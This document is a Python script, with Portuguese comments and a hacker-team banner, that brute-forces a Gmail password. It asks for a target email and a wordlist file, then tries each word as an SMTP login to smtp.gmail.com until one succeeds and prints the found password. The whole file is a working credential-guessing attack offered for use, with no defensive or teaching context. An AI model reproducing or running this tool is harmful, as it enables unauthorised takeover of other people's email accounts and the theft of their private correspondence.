#!/usr/bin/python

import smtplib

def abrir_arquivo_senhas(senhas_arquivo):
    with open(senhas_arquivo, "r") as senhas:
        senhas = senhas.readlines()
    return senhas

def main():
    # Exibe um cabeçalho informativo
    print("""
+++++++++++++++++++++++++++++
+ SCRIPT FEITO POR SR. ALTO +
+              +
+   SALVE #HYS TEAM    +
+              +
+   Versao 1.0      +
+              +
+ https://github.com/SrAlto +
+++++++++++++++++++++++++++++
                                                                                              
""")

    # Obtém as credenciais de e-mail do usuário
    email = input("Digite o email: ")
    senhas_arquivo = input("Digite o caminho da Wordilist: ")

    # Abre o arquivo de senhas
    senhas = abrir_arquivo_senhas(senhas_arquivo)

    # Itera sobre cada senha no arquivo
    for senha in senhas:
        # Tenta fazer login com a senha
        try:
            smtp = smtplib.SMTP("smtp.gmail.com", 587)
            smtp.ehlo()
            smtp.starttls()
            smtp.login(email, senha)

            # Exibe a senha se o login for bem-sucedido
            print("Senha: %s" % senha)
            break
        except smtplib.SMTPAuthenticationError:
            # Exibe uma mensagem de erro se o login falhar
            print("Falhou")

if __name__ == "__main__":
    main()
  
